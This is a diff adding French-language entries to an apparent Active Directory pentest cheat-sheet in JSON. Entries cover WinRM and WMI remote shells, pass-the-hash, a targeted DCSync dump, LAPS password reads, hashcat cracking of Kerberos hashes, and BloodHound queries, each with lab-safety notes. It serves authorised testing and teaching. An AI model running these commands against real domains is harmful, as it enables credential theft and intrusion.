+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "kerberos"
+      ]
+    },
+    {
+      "id": "winrm-test",
+      "title": "WinRM : vérifier accès",
+      "phase": "Accès",
+      "tool": "NetExec",
+      "command": "nxc winrm {{target}} -d {{domain}} -u {{user}} -p {{password}}",
+      "summary": "Tester l’authentification et l’autorisation WinRM.",
+      "requires": "WinRM ouvert et compte valide.",
+      "reading": "Un compte de domaine valide peut être interdit de remoting.",
+      "next": "Examiner les groupes locaux Remote Management Users / Administrators.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds"
+      ]
+    },
+    {
+      "id": "evilwinrm",
+      "title": "WinRM : ouvrir session",
+      "phase": "Accès",
+      "tool": "Evil-WinRM",
+      "command": "evil-winrm -i {{target}} -u {{user}} -p {{password}}",
+      "summary": "Ouvrir un shell PowerShell si autorisé.",
+      "requires": "WinRM activé et droit de connexion distante.",
+      "reading": "Échec AuthorizationError ≠ mauvais mot de passe.",
+      "next": "Dresser contexte de la machine et permissions.",
+      "risk": "sensible",
+      "source": "https://github.com/Hackplayers/evil-winrm",
+      "tags": [
+        "avec-creds",
+        "shell"
+      ]
+    },
+    {
+      "id": "evilwinrm-hash",
+      "title": "WinRM : authentification NT hash",
+      "phase": "Accès",
+      "tool": "Evil-WinRM",
+      "command": "evil-winrm -i {{target}} -u {{user}} -H {{hash}}",
+      "summary": "Tester l’accès avec un NT hash déjà obtenu légalement.",
+      "requires": "Service compatible, hash NT valide, droit WinRM.",
+      "reading": "Ne pas utiliser le champ LM placeholder.",
+      "next": "Examiner l’identité et son niveau de privilèges.",
+      "risk": "sensible",
+      "source": "https://github.com/Hackplayers/evil-winrm",
+      "tags": [
+        "hash",
+        "shell"
+      ]
+    },
+    {
+      "id": "wmiexec",
+      "title": "WMI : exécution distante",
+      "phase": "Accès",
+      "tool": "Impacket",
+      "command": "impacket-wmiexec {{domain}}/{{user}}:{{password}}@{{target}}",
+      "summary": "Accès semi-interactif via WMI/DCOM sur une machine de lab.",
+      "requires": "Droits d’exécution distante suffisants, RPC/DCOM accessible.",
+      "reading": "SMB READ ne suffit pas pour WMI execution.",
+      "next": "Examiner administrateurs locaux et services.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "avec-creds",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-whoami",
+      "title": "Windows : contexte local",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "whoami /all; hostname; ipconfig /all; klist",
+      "summary": "Lister l’identité, les privilèges, les groupes et le contexte réseau.",
+      "requires": "Un accès shell Windows.",
+      "reading": "SeImpersonatePrivilege ne garantit pas à lui seul une élévation.",
+      "next": "Noter les sessions Kerberos, services, groupes locaux et domaines.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/",
+      "tags": [
+        "windows",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-users",
+      "title": "Windows : utilisateurs AD (RSAT)",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-ADUser -Filter * -Properties Description,ServicePrincipalName | Select-Object SamAccountName,Enabled,Description",
+      "summary": "Lister utilisateurs et attributs via le module AD de Windows.",
+      "requires": "Module ActiveDirectory présent et autorisation de lecture AD.",
+      "reading": "Get-ADUser n’est pas intégré à toutes les machines Windows.",
+      "next": "Compléter avec Get-ADGroup et Get-ADComputer.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/",
+      "tags": [
+        "windows",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-gpo",
+      "title": "Windows : GPO liées à une OU",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-GPInheritance -Target {{ouDn}}",
+      "summary": "Lister héritage et GPO liées à une OU via module GroupPolicy.",
+      "requires": "Module GroupPolicy/RSAT et identité autorisée.",
+      "reading": "Un GPO linked n’implique pas qu’il applique effectivement toutes les configurations.",
+      "next": "Vérifier filtrage de sécurité, héritage et WMI filters.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpinheritance",
+      "tags": [
+        "windows",
+        "gpo"
+      ]
+    },
+    {
+      "id": "win-service",
+      "title": "Windows : services et comptes",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName,State",
+      "summary": "Chercher les identités de services et chemins sensibles.",
+      "requires": "Shell Windows avec accès CIM local.",
+      "reading": "Un chemin contenant des espaces n’est pas automatiquement exploitable.",
+      "next": "Contrôler ACL et contexte d’exécution.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/",
+      "tags": [
+        "windows",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-task",
+      "title": "Windows : tâches planifiées",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-ScheduledTask | Select-Object TaskName,TaskPath,State",
+      "summary": "Inventorier les tâches locales et leurs chemins.",
+      "requires": "Shell Windows avec les droits de lecture nécessaires.",
+      "reading": "Les tâches visibles ne sont pas toutes modifiables.",
+      "next": "Consulter action, principal et autorisations.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/",
+      "tags": [
+        "windows",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-wlaps",
+      "title": "Windows : inventaire LAPS",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-LapsADPassword -Identity {{computer}}",
+      "summary": "Vérifier les droits de lecture de mots de passe Windows LAPS.",
+      "requires": "Module LAPS et permission AD appropriée.",
+      "reading": "La commande peut afficher des informations sensibles : ne pas publier les sorties.",
+      "next": "Vérifier la délégation de lecture.",
+      "risk": "sensible",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword",
+      "tags": [
+        "windows",
+        "secrets"
+      ]
+    },
+    {
+      "id": "win-smbsign",
+      "title": "Windows : SMB signing",
+      "phase": "Durcissement",
+      "tool": "PowerShell",
+      "command": "Get-SmbServerConfiguration | Select-Object RequireSecuritySignature,EnableSecuritySignature; Get-SmbClientConfiguration | Select-Object RequireSecuritySignature",
+      "summary": "Vérifier l’état de SMB signing côté client et serveur Windows.",
+      "requires": "Shell PowerShell local autorisé.",
+      "reading": "Windows Server 2025 et Windows 11 24H2 ont des défauts de signature renforcés.",
+      "next": "Évaluer les relais NTLM au regard des protections effectives.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing",
+      "tags": [
+        "windows",
+        "defense"
+      ]
+    },
+    {
+      "id": "win-ldap-sign",
+      "title": "Windows : politique LDAP signing",
+      "phase": "Durcissement",
+      "tool": "PowerShell",
+      "command": "Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\" -Name LDAPServerIntegrity -ErrorAction SilentlyContinue",
+      "summary": "Lire l’exigence LDAP server signing sur un DC.",
+      "requires": "Exécution locale sur DC avec droits de lecture registre.",
+      "reading": "Absence de clé peut dépendre de defaults et version OS; ne pas inférer automatiquement disabled.",
+      "next": "Vérifier events Directory Service 2886–2889 et channel binding.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing",
+      "tags": [
+        "windows",
+        "defense"
+      ]
+    },
+    {
+      "id": "win-time",
+      "title": "Windows : temps Kerberos",
+      "phase": "Durcissement",
+      "tool": "PowerShell",
+      "command": "w32tm /query /status; w32tm /query /source",
+      "summary": "Diagnostiquer la synchronisation horaire impactant Kerberos.",
+      "requires": "Shell Windows.",
+      "reading": "Un écart temporel important provoque des erreurs d’authentification Kerberos.",
+      "next": "Comparer au DC et au client Kali.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/get-started/whats-new-windows-server-2025",
+      "tags": [
+        "windows",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "imp-secretsdump",
+      "title": "DCSync : preuve ciblée",
+      "phase": "Secrets",
+      "tool": "Impacket",
+      "command": "impacket-secretsdump {{domain}}/{{user}}:{{password}}@{{target}} -just-dc-user {{targetUser}}",
+      "summary": "Valider les droits de réplication DCSync sur un compte cible de test.",
+      "requires": "Droits DS-Replication-Get-Changes et Get-Changes-All sur le domaine, compte autorisé.",
+      "reading": "DCSync est une lecture très sensible : ne jamais publier les secrets et éviter l’extraction globale.",
+      "next": "Documenter l’ACL ayant permis la réplication et remédier.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "avec-creds",
+        "secrets",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "ldap-dmsa",
+      "title": "Windows Server 2025 : objets dMSA",
+      "phase": "Moderne",
+      "tool": "ldapsearch",
+      "command": "ldapsearch -x -H ldap://{{target}} -D {{userUpn}} -w {{password}} -b {{baseDn}} \"(objectClass=msDS-DelegatedManagedServiceAccount)\" sAMAccountName msDS-DelegatedMSAState msDS-ManagedAccountPrecededByLink",
+      "summary": "Recenser les dMSA et liens de migration entre comptes.",
+      "requires": "Schéma AD compatible dMSA, droits LDAP; fonctionnalités Server 2025.",
+      "reading": "La présence d’un dMSA ne prouve pas BadSuccessor; correctif CVE-2025-53779 déterminant.",
+      "next": "Vérifier version des DC, attributs et permissions sur OU/objets.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview",
+      "tags": [
+        "avec-creds",
+        "modern",
+        "kerberos"
+      ]
+    },
+    {
+      "id": "win-adcs-pki",
+      "title": "Windows : templates AD CS",
+      "phase": "AD CS",
+      "tool": "PowerShell",
+      "command": "certutil -catemplates",
+      "summary": "Lister les modèles publiés par une CA depuis un hôte Windows.",
+      "requires": "Certutil disponible et accès CA.",
+      "reading": "Les templates visibles ne sont pas nécessairement enrôlables ni vulnérables.",
+      "next": "Valider permissions, EKU, responsables, mapping et SAN.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/",
+      "tags": [
+        "windows",
+        "adcs"
+      ]
+    },
+    {
+      "id": "tls-ldap",
+      "title": "LDAPS : certificat du DC",
+      "phase": "Durcissement",
+      "tool": "OpenSSL",
+      "command": "openssl s_client -connect {{target}}:636 -servername {{dcHost}} -brief </dev/null",
+      "summary": "Contrôler disponibilité TLS et chaîne présentée par LDAPS.",
+      "requires": "LDAPS ouvert et dcHost DNS du certificat.",
+      "reading": "Un simple bind sans TLS sur 389 expose les credentials sur un réseau non isolé.",
+      "next": "Comparer CN/SAN et vérifier politiques LDAP signing/channel binding.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing",
+      "tags": [
+        "sans-creds",
+        "defense"
+      ]
+    },
+    {
+      "id": "nxc-version",
+      "title": "Diagnostic NetExec/Impacket",
+      "phase": "Dépannage",
+      "tool": "Shell Linux",
+      "command": "nxc --version; pipx list; pipx runpip netexec show impacket",
+      "summary": "Identifier le triplet nxc, Python et Impacket installé.",
+      "requires": "NetExec installé via pipx et commandes disponibles.",
+      "reading": "Erreur impacket.krb5.pkinit = module absent ou dépendance désynchronisée, pas échec LDAP du DC.",
+      "next": "Comparer les dépendances aux exigences du commit NetExec avant de réparer.",
+      "risk": "lecture",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "tooling"
+      ]
+    },
+    {
+      "id": "krb-debug",
+      "title": "Kerberos : diagnostic Linux",
+      "phase": "Dépannage",
+      "tool": "Shell Linux",
+      "command": "getent hosts {{dcHost}}; date -u; klist; env | grep -E \"^(KRB5CCNAME|KRB5_CONFIG)=\"",
+      "summary": "Inspecter DNS, temps et cache Kerberos côté Kali.",
+      "requires": "Nom DC connu.",
+      "reading": "Kerberos exige souvent un FQDN cohérent; adresse IP seule peut produire des erreurs SPN.",
+      "next": "Corriger la résolution et valider tickets avant de changer d’outil.",
+      "risk": "lecture",
+      "source": "https://github.com/fortra/impacket/tree/master/examples",
+      "tags": [
+        "kerberos",
+        "tooling"
+      ]
+    },
+    {
+      "id": "smb-sign-nxc",
+      "title": "SMB : vérifier la signature",
+      "phase": "Durcissement",
+      "tool": "NetExec",
+      "command": "nxc smb {{target}} -u \"\" -p \"\"",
+      "summary": "Lire le bandeau SMB de NetExec (OS, domaine, signing si retourné).",
+      "requires": "SMB accessible; même sans auth, des métadonnées peuvent être révélées.",
+      "reading": "L’absence de champ signing dans la sortie n’est pas preuve que le serveur ne signe pas.",
+      "next": "Croiser avec configuration Windows ou un outil de test ciblé.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing",
+      "tags": [
+        "sans-creds",
+        "defense"
+      ]
+    },
+    {
+      "id": "certipy-account",
+      "title": "Certipy : lire identité et SID",
+      "phase": "AD CS",
+      "tool": "Certipy",
+      "command": "certipy account -u {{userUpn}} -p {{password}} -dc-ip {{target}} -user {{targetUser}} read",
+      "summary": "Lire les informations d’identité utiles à l’analyse de mapping des certificats.",
+      "requires": "Compte authentifié, Certipy avec sous-commande account.",
+      "reading": "Les critères de mapping strict peuvent empêcher une élévation basée seulement sur UPN.",
+      "next": "Contrôler SID attendu et restrictions de mappage.",
+      "risk": "lecture",
+      "source": "https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage",
+      "tags": [
+        "avec-creds",
+        "adcs"
+      ]
+    },
+    {
+      "id": "win-ad-group",
+      "title": "Windows : membres groupe",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-ADGroupMember -Identity {{group}} -Recursive | Select-Object Name,SamAccountName,ObjectClass",
+      "summary": "Énumérer membres directs et transitifs d’un groupe AD.",
+      "requires": "Module ActiveDirectory installé.",
+      "reading": "La récursion élimine une partie du contexte des chemins; sauvegarder aussi les liens directs.",
+      "next": "Vérifier les ACE et les groupes imbriqués dans BloodHound.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/",
+      "tags": [
+        "windows",
+        "acl"
+      ]
+    },
+    {
+      "id": "win-dmsa",
+      "title": "Windows : dMSA par LDAP PowerShell",
+      "phase": "Moderne",
+      "tool": "PowerShell",
+      "command": "Get-ADObject -LDAPFilter \"(objectClass=msDS-DelegatedManagedServiceAccount)\" -Properties msDS-DelegatedMSAState,msDS-ManagedAccountPrecededByLink | Select-Object Name,DistinguishedName,msDS-DelegatedMSAState,msDS-ManagedAccountPrecededByLink",
+      "summary": "Auditer les relations de migration des dMSA dans un domaine moderne.",
+      "requires": "Module ActiveDirectory et schéma dMSA présent.",
+      "reading": "Des attributs inattendus doivent être corrélés aux droits d’écriture et aux events 5136.",
+      "next": "Vérifier CVE-2025-53779 et l’hygiène de délégation.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview",
+      "tags": [
+        "windows",
+        "modern"
+      ]
+    },
+    {
+      "id": "win-gpo-perms",
+      "title": "Windows : permissions GPO",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-GPPermission -Name {{gpo}} -All",
+      "summary": "Lire les délégations sur une GPO avant toute hypothèse d’abus.",
+      "requires": "Module GroupPolicy installé; lecture autorisée.",
+      "reading": "Droits sur l’objet GPO et WriteGPLink sur l’OU sont deux choses différentes.",
+      "next": "Corréler scope et liens GPO puis vérifier contenu SYSVOL.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gppermission",
+      "tags": [
+        "windows",
+        "gpo",
+        "acl"
+      ]
+    },
+    {
+      "id": "win-localadmins",
+      "title": "Windows : administrateurs locaux",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-LocalGroupMember -Group Administrators",
+      "summary": "Identifier les administrateurs locaux du poste.",
+      "requires": "Module LocalAccounts accessible; fonctionne sur station/serveur membre selon configuration.",
+      "reading": "Ne pas extrapoler les droits locaux à l’ensemble du domaine.",
+      "next": "Comparer avec BloodHound AdminTo et groupes de domaine.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/",
+      "tags": [
+        "windows",
+        "shell"
+      ]
+    },
+    {
+      "id": "win-gpo-update",
+      "title": "Windows : application GPO",
+      "phase": "Durcissement",
+      "tool": "PowerShell",
+      "command": "gpresult /r /scope computer",
+      "summary": "Afficher les GPO effectivement appliquées à la machine.",
+      "requires": "Shell Windows; un compte non administrateur peut avoir une visibilité partielle.",
+      "reading": "Un lien LDAP n’entraîne pas nécessairement application (security filtering, WMI, héritage).",
+      "next": "Contraster avec LDAP gPLink et gpresult /h lorsque pertinent.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
+      "tags": [
+        "windows",
+        "gpo",
+        "defense"
+      ]
+    },
+    {
+      "id": "hashcat-asrep",
+      "title": "AS-REP : audit hors ligne",
+      "phase": "Secrets",
+      "tool": "Hashcat",
+      "command": "hashcat -m 18200 asrep.hashes {{wordlist}}",
+      "summary": "Tester la résistance des secrets hors ligne dans le lab.",
+      "requires": "Un fichier de hashes AS-REP obtenu légalement et autorisation de test.",
+      "reading": "Ne pas utiliser -O si la longueur attendue dépasse les limites optimisées.",
+      "next": "Documenter uniquement la faiblesse et changer le mot de passe vulnérable.",
+      "risk": "sensible",
+      "source": "https://hashcat.net/wiki/doku.php?id=example_hashes",
+      "tags": [
+        "hashes",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "hashcat-tgs",
+      "title": "TGS RC4 : audit hors ligne",
+      "phase": "Secrets",
+      "tool": "Hashcat",
+      "command": "hashcat -m 13100 kerberoast.hashes {{wordlist}}",
+      "summary": "Tester uniquement les tickets TGS RC4-HMAC dans un lab.",
+      "requires": "Vérifier etype 23; autres etypes requièrent un mode différent.",
+      "reading": "Kerberoast n’implique pas toujours RC4 sur les DC récents.",
+      "next": "Ne pas mélanger les formats dans un même mode.",
+      "risk": "sensible",
+      "source": "https://hashcat.net/wiki/doku.php?id=example_hashes",
+      "tags": [
+        "hashes",
+        "lab-advance"
+      ]
+    },
+    {
+      "id": "ad105-forest-model",
+      "title": "AD105 : cartographier les forêts et pivots",
+      "phase": "Trusts",
+      "tool": "Note",
+      "command": "SOKOLO.dojo  <->  LONIPO.dojo  <->  BORITO.dojo\n# Relever DC par forêt, routage, sens du trust, SID filtering, ticket et principal courant.",
+      "summary": "Exemple pédagogique AD105 (SecDojo) : trois forêts; une relation graphique ne donne ni ticket ni reachability.",
+      "requires": "Topologie ou notes du lab, ne pas copier les IP des write-ups.",
+      "reading": "La visibilité DNS, port 88, LDAP et SMB change selon la machine source et la forêt.",
+      "next": "Construire la matrice source→destination avant toute délégation.",
+      "risk": "lecture",
+      "source": "https://github.com/SaamNoLimits/AD105-WriteUP",
+      "tags": [
+        "trust",
+        "lab-advance"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-ldap-gssapi",
+      "title": "Lister les objets trustedDomain en LDAP/GSSAPI",
+      "phase": "Trusts",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(objectClass=trustedDomain)\" cn trustPartner trustDirection trustType trustAttributes securityIdentifier",
+      "summary": "Lire les objets de confiance depuis le domaine interrogé.",
+      "requires": "Un ticket GSSAPI utilisable pour LDAP et le FQDN correct du DC.",
+      "reading": "Les valeurs de trustDirection sont relatives au côté où l’objet est lu; tester réciproquement.",
+      "next": "Comparer avec Get-ADTrust dans la forêt opposée.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c",
+      "tags": [
+        "avec-creds",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-win-info",
+      "title": "Windows : propriétés précises des trusts",
+      "phase": "Trusts",
+      "tool": "PowerShell",
+      "command": "Get-ADTrust -Filter * -Properties * | Select-Object Name,Direction,TrustType,TrustAttributes,SelectiveAuthentication,ForestTransitive | Format-Table -AutoSize",
+      "summary": "Inventorier confiance, direction, attributs et authentification sélective.",
+      "requires": "RSAT ActiveDirectory et droits d’énumération.",
+      "reading": "Ne jamais déduire qu’un trust bidirectionnel autorise l’accès à tous les services.",
+      "next": "Vérifier RBCD, SID filtering, SPN et réseaux inter-forêts.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust",
+      "tags": [
+        "windows",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-netdom",
+      "title": "Windows : vue des trusts avec nltest",
+      "phase": "Trusts",
+      "tool": "CMD",
+      "command": "nltest /domain_trusts /all_trusts /v",
+      "summary": "Vue côté machine des trusts visibles.",
+      "requires": "Shell Windows joint au domaine.",
+      "reading": "Une ligne trust ne prouve pas la possibilité de s’authentifier sur la cible.",
+      "next": "Comparer les valeurs LDAP et vérifier DNS inter-forêts.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nltest",
+      "tags": [
+        "windows",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-direction-check",
+      "title": "Direction du trust : aide de lecture",
+      "phase": "Trusts",
+      "tool": "Note",
+      "command": "trustDirection: 1 = INBOUND, 2 = OUTBOUND, 3 = BIDIRECTIONAL (du point de vue du TDO local)\ntrustAttributes: 0x8 = FOREST_TRANSITIVE; 0x40 = CROSS_ORGANIZATION; 0x800 = ENABLE_TGT_DELEGATION\n# 0x48 = 0x40+0x8; 0x808 = 0x800+0x8. Ne pas confondre protection SID et délégation.",
+      "summary": "Interpréter des attributs de trust sans inventer la capacité de traverser une forêt.",
+      "requires": "Valeurs récupérées dans trustedDomain et deux côtés du trust.",
+      "reading": "Attributs ≠ ticket valide, ni filtrage SID désactivé, ni permission locale.",
+      "next": "Prouver referral ticket + demande TGS + authentification cible.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c",
+      "tags": [
+        "trust",
+        "lab-advance"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-dns-srv",
+      "title": "DNS Kerberos dans une forêt distante",
+      "phase": "Trusts",
+      "tool": "dig",
+      "command": "dig @{{target}} _kerberos._tcp.{{trustDomain}} SRV +short; dig @{{target}} _ldap._tcp.dc._msdcs.{{trustDomain}} SRV +short",
+      "summary": "Tester la découverte des DC d’une forêt de confiance depuis le résolveur du lab.",
+      "requires": "Ajouter un champ trustDomain correspondant au DNS de la forêt cible.",
+      "reading": "L’absence de SRV peut venir du conditional forwarder ou du routage.",
+      "next": "Résoudre les hôtes puis tester 88/389/445 depuis chaque pivot.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/dns-and-ad-ds",
+      "tags": [
+        "trust",
+        "sans-creds"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-reachability",
+      "title": "Matrice de joignabilité inter-forêts",
+      "phase": "Trusts",
+      "tool": "bash",
+      "command": "for p in 53 88 135 389 445 464 636 3268 5985; do timeout 2 bash -c \"</dev/tcp/{{targetHost}}/$p\" >/dev/null 2>&1 && echo \"$p open\" || echo \"$p blocked\"; done",
+      "summary": "Établir les ports réellement accessibles vers un DC/serveur depuis le point d’entrée courant.",
+      "requires": "Lab isolé; TCP seulement; targetHost doit être l’IP/FQDN souhaité.",
+      "reading": "Un tunnel entrant ne donne pas automatiquement un chemin retour DC→Kali.",
+      "next": "Tester séparément les retours nécessaires pour coercion/trust.",
+      "risk": "lecture",
+      "source": "https://nmap.org/book/man.html",
+      "tags": [
+        "sans-creds",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-spn-win",
+      "title": "Windows : identifier les SPN du service cible",
+      "phase": "Trusts",
+      "tool": "PowerShell",
+      "command": "setspn -Q {{spn}}",
+      "summary": "Confirmer l’objet AD détenteur du SPN avant de requérir un TGS.",
+      "requires": "Connaître le SPN complet et être dans un domaine joignable.",
+      "reading": "SPN dupliqué ou mauvais realm produit des échecs distincts des ACL.",
+      "next": "Vérifier la casse du service/FQDN et demander le ticket adapté.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn",
+      "tags": [
+        "windows",
+        "kerberos"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "bh-all-owned",
+      "title": "BloodHound CE : relations au départ des objets owned",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (n) WHERE n.owned=true MATCH p=(n)-[*1..3]->(m) RETURN p LIMIT 100",
+      "summary": "Explorer plusieurs chemins, pas seulement le shortest path vers Domain Admin.",
+      "requires": "BloodHound CE chargé; propriété owned dépend de version/import.",
+      "reading": "La syntaxe/propriété et les relations varient avec la version CE; vérifier le schéma.",
+      "next": "Inspecter les ACEs, objet cible, privilèges et héritage.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "acl"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "bh-rbcd-edges",
+      "title": "BloodHound CE : relations AllowedToAct",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (a)-[r:AllowedToAct]->(b) RETURN a.name AS source, type(r) AS edge, b.name AS cible LIMIT 100",
+      "summary": "Identifier des relations RBCD potentielles.",
+      "requires": "Collection CE couvrant la délégation; vérifier le nom de relation sur la version courante.",
+      "reading": "Une edge n’est pas le droit d’écrire le descripteur; lire msDS-AllowedToActOnBehalfOfOtherIdentity.",
+      "next": "Lire l’objet computer et son ACL, puis tester S4U seulement si autorisé.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "rbcd"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "bh-writeaccountrestrictions",
+      "title": "BloodHound CE : WriteAccountRestrictions",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (a)-[r:WriteAccountRestrictions]->(b) RETURN a.name, b.name LIMIT 100",
+      "summary": "Voir les contrôles de propriétés liés aux restrictions des comptes ordinateurs.",
+      "requires": "Edges disponibles via collecteur et version.",
+      "reading": "Doit être interprété par la classe de l’objet et le droit exact sur l’attribut.",
+      "next": "Valider effective ACE et destination du descripteur RBCD.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "rbcd",
+        "acl"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "bh-gp-link",
+      "title": "BloodHound CE : analyse WriteGPLink",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (a)-[r:WriteGPLink]->(b) RETURN a.name,b.name LIMIT 100",
+      "summary": "Contrôle des liaisons de GPO : distinguer gPLink et édition du GPO.",
+      "requires": "Collecteur avec accès aux relations OU/GPO.",
+      "reading": "Modifier gPLink n’implique pas contrôler le contenu d’une GPO.",
+      "next": "Inspecter filtre, héritage, GPO effectives et utilisateurs ciblés.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "gpo"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "bh-trustmap",
+      "title": "BloodHound CE : propriétés des domaines",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (d:Domain) RETURN d.name, d.objectid LIMIT 50",
+      "summary": "Inventaire rapide des domaines représentés dans le graphe.",
+      "requires": "Collections depuis chaque forêt; données partielles possibles.",
+      "reading": "Un graphe vide pour une forêt n’établit pas son absence.",
+      "next": "Requête LDAP trustedDomain indépendante.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "trust"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "bh-degree",
+      "title": "BloodHound CE : utilisateurs à fortes relations sortantes",
+      "phase": "Graphe",
+      "tool": "Cypher",
+      "command": "MATCH (u:User)-[r]->(n) RETURN u.name AS user, count(r) AS relations ORDER BY relations DESC LIMIT 30",
+      "summary": "Repérer des identités de service opérant sur beaucoup d’objets.",
+      "requires": "DB Neo4j CE accessible en lecture.",
+      "reading": "Beaucoup d’edges ne signifie pas automatiquement vulnérabilité.",
+      "next": "Inspecter les types de permissions et droits effectifs.",
+      "risk": "lecture",
+      "source": "https://bloodhound.specterops.io/",
+      "tags": [
+        "bloodhound",
+        "acl"
+      ],
+      "category": "BloodHound avancé"
+    },
+    {
+      "id": "rbcd-impacket-read",
+      "title": "RBCD : lecture avec Impacket",
+      "phase": "Délégation",
+      "tool": "Impacket",
+      "command": "impacket-rbcd -action read -delegate-to {{targetComputer}} -dc-ip {{target}} {{domain}}/{{user}}:{{password}}",
+      "summary": "Lire le descripteur de délégation basé sur ressource sur un objet ordinateur.",
+      "requires": "Un compte autorisé à lire l’attribut; targetComputer typiquement COMPUTER$.",
+      "reading": "Valeur absente ou vide ≠ possibilité de la modifier; lire les ACL séparément.",
+      "next": "Vérifier WriteAccountRestrictions/GenericWrite/GenericAll sur cet objet.",
+      "risk": "lecture",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/rbcd.py",
+      "tags": [
+        "avec-creds",
+        "rbcd"
+      ],
